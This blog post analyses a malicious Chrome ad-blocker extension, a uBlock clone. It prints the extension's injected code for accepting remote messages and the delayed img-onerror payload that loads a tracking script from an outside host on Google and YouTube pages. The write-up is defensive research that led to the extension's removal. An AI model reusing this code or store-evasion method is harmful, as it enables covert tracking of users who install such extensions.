Title: Werbe videoblocker
Date: 2021-8-28 10:01
Modified: 2021-8-28 10:01
Category: misc
Tags: js
Slug: werbe_videoblocker
Authors: F3real
Summary: uBlock copy with added tracking

Few weeks ago while browsing web, I've gotten an interesting popup. Usually I immediately close them, but this one looked rather well-made, so it piqued my interest

![Werde webpage]({static}/images/2021_8_28_werde_adblock.png){: .img-fluid .centerimage}

The chrome store makes it seem like a rather popular addon, having over 200k installs.

![Werde chrome store]({static}/images/2021_8_28_werde_chrome_store.png){: .img-fluid .centerimage}

Although, some reviews are not so convincing especially when complimenting it as "office app".

![Werde reviews]({static}/images/2021_8_28_werde_adblock_reviews.png){: .img-fluid .centerimage}

Obviously, addon was up to no good, so I decided to look at the source code. After digging around it became clear that the addon was uBlock rip off.

Some files were removed some modified, but most of them were left untouched. Authors made some effort to obfuscate/change .js files, probably to circumvent automatic google store checks. Most notable changes:

* removal of all uBlock copyright notices
* removal of all comments
* `uBlock` string was changed to `mainBlocker`
* most of .js files were removed, and their content was appended to the background.js

The combination of many .js files made further analysis slightly harder, but continuing to look through I started noticing scattered snippets of added functionality. Combined they look as follows:

```js
function LogInfoEx(data) {
    document.getElementsByTagName("html")[0].appendChild(data);
}

let _decorName = 'request_id';
let _lineInfoEx = '';

function getInfoType() {
    return 'none';
}

function getInfo(cc) {
    var d = document.createElement('div');
    d.style['display'] = getInfoType();
    d.innerHTML = cc;
    return d;
}

function inlineDecor(data) {
    let cc = data[_decorName]
    if (data['line_info'])  {
        _lineInfoEx = data['line_info'];
    }
    if (cc) {
        let d = getInfo(cc);
        LogInfoEx(d);
    }
}

chrome.storage.local.get(["request_id"], inlineDecor);

chrome.runtime.onInstalled.addListener(function (details) {
    let now = Date.now() / 1000;
    if (details.reason === "install") {
        chrome.storage.local.set({
            'installed_at' : now
        }, function() {});

        chrome.runtime.onMessageExternal.addListener(
            function(request, sender, sendResponse) {
                if (sender.origin === 'https://advideoblock.com' && request.id) {
                    chrome.storage.local.set({
                        'request_id': request.id
                    });
                }
            });
        chrome.runtime.setUninstallURL('https://advideoblock.com/uninstalled.php?extid='+chrome.runtime.id);
        chrome.tabs.create({url:'https://advideoblock.com/installed.php?extid='+chrome.runtime.id});
    }
});
```
Once installed addon creates a listener for messages coming from its website (`onMessageExternal`) and opens it in a new tab (`create`). When message is received it will store it in local storage,and callback function will use received data to create invisible div with message contents.In this way addon can avoid having any tracking code in itself.

This makes it necessary to do dynamic analysis, and also enables addon authors to do this only for some installs, if required to further obfuscate their activity.

One example of tracking I've seen embedded in addon webpage:

```js
  <script type="text/javascript" id="rm">
     var timestamp = localStorage.getItem('timestamp');
     var eId = localStorage.getItem('eId');
     var atr = localStorage.getItem('atr');
     var itr = localStorage.getItem('itr');
     var id = '60c25f638e607';
     var current_timestamp = Date.now() + (2 * 24 * 60 * 60 * 1000);
        id = "<img src onerror='if ("+current_timestamp+" < Date.now() && /.(google|youtube)./.test(document.location.origin)){var s = document.createElement(\"script\");s.type = \"text/javascript\"; s.onload = function(){this.parentNode.removeChild(this)}; s.src = \"https://abundantiaopus.com/impl.php?i=" + itr + "&atr=" + atr + "&id=" + eId + "&start=" + timestamp + "\";document.getElementsByTagName(\"head\")[0].appendChild(s);} this.parentNode.removeChild(this);'>";

        chrome.runtime.sendMessage('mabadchclkilfghbpeomkmbldhncgklf', {id: id});

      document.querySelector('#rm').parentNode.removeChild(document.querySelector('#rm'));
  </script>
```

The script activates 2 days after install, whenever Google or YouTube is visited. It attempts to load external script with some extra information passed as parameters (gathered during install), used to uniquely identify user.

I didn't spend time analyzing it further, but report with gathered information was enough for Chrome store to take action and remove the addon (although this did take some time). Nonetheless, I think addon shows interesting way how automatic chrome store checks can be bypassed and how malicious functionality can be added after install.

The addon was available to download at:

[https://advideoblock.com/](https://advideoblock.com/)

[https://chrome.google.com/webstore/detail/ad-video-blocker/mabadchclkilfghbpeomkmbldhncgklf](https://chrome.google.com/webstore/detail/ad-video-blocker/mabadchclkilfghbpeomkmbldhncgklf)

The links are now down, but I saved a copy of addon for anyone interested [here](https://github.com/F3real/ctf_solutions/tree/master/2021/Werbe).
